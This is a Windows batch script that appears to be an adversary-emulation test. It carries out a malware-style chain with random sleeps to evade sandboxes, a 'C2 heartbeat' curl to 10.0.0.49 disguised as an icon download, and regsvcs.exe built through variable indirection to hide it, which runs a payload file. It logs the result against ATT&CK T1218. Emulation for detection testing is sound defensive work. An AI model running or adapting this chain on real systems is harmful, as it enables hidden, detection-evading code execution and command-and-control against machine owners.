@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals)
SET zxxda=%APPDATA%\8814\6a3d490f
SET mkqszc=https://10.0.0.49
SET vbnpzs=https://10.0.0.49/stage/2/icon.png?8814-7
SET azxmn=ITZEL-S2BO
SET qplmkj=7
SET ojndjs=illustrator.txt
SET rtynbc=8814

REM Computed paths
SET logf=%APPDATA%\!qplmkj!\macula-simulations.log

REM Initial delay (30-60s)
SET /A d1=!RANDOM! %% 30 + 30
echo [!DATE! !TIME!][DEBUG][!azxmn!]: initial_delay=!d1!s>> "!logf!" 2>nul
timeout /t !d1! /nobreak >nul

REM C2 heartbeat (must be first operation)
echo [!DATE! !TIME!][DEBUG][!azxmn!]: heartbeat_start>> "!logf!" 2>nul
curl -k -s -o nul "!vbnpzs!"
echo [!DATE! !TIME!][DEBUG][!azxmn!]: heartbeat_complete>> "!logf!" 2>nul

REM Delay 5-15s (ping)
SET /A d2=!RANDOM! %% 10 + 5
echo [!DATE! !TIME!][DEBUG][!azxmn!]: delay2=!d2!s>> "!logf!" 2>nul
ping -n !d2! 127.0.0.1 >nul

REM Change directory
echo [!DATE! !TIME!][DEBUG][!azxmn!]: chdir_start>> "!logf!" 2>nul
cd /d "!zxxda!"
echo [!DATE! !TIME!][DEBUG][!azxmn!]: chdir_complete>> "!logf!" 2>nul

REM Random delay 10-30s
SET /A d3=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!azxmn!]: random_delay=!d3!s>> "!logf!" 2>nul
timeout /t !d3! /nobreak >nul

REM Obfuscated regsvcs.exe execution (variable indirection)
SET a1=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\
SET a2=reg
SET a3=svcs
SET a4=.exe
SET b1=!a2!
SET b2=!a3!
SET b3=!a4!
CALL SET execbin=%%a1%%%%b1%%%%b2%%%%b3%%
SET fvar=!ojndjs!

echo [!DATE! !TIME!][DEBUG][!azxmn!]: execute_start>> "!logf!" 2>nul
!execbin! "!fvar!"

REM TTP logging
IF !ERRORLEVEL! EQU 0 (
    SET ttp_res=1
    SET ttp_err=
) ELSE (
    SET ttp_res=0
    SET ttp_err=exec_failed
)

SET ttp_id=T1218
SET ttp_name=SignedBinaryProxyExecution
echo [!DATE! !TIME!][!azxmn!]: !qplmkj!-!rtynbc!-!ttp_id!|!ttp_name!=!ttp_res!:!ttp_err!>> "!logf!" 2>nul

echo [!DATE! !TIME!][DEBUG][!azxmn!]: script_complete>> "!logf!" 2>nul
ENDLOCAL